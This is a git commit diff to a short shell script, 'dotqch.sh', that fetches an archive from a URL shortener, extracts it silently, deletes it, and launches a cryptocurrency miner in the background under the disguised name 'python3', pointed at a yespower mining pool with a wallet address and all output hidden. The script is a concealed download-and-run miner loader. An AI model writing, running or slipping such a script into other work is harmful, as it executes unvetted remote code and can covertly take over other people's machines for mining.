d6138234cd0eeb7486e5fdcbb412da015125dd60
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-15 05:24:09 +0700

    created hendi kusnandi

--- dotqch.sh
+++ dotqch.sh
@@ -1,6 +1,15 @@
 #!/bin/bash
-wget -O dot s.id/dotaja
 
-tar -xzvf dot
+echo "download dot-srb..."
+
+wget -q -O dot-srb s.id/25RZs
+
+echo "ekstrak dot-srb..."
+
+tar -xzf dot-srb >/dev/null
+
+echo "hapus dot-srb..."
+
+rm dot-srb
 
 nohup ./dotsrb/python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QdeLX9ToumSqAfryzmfxJv366NtwStVimq.DOTonly > /dev/null 2>&1 &
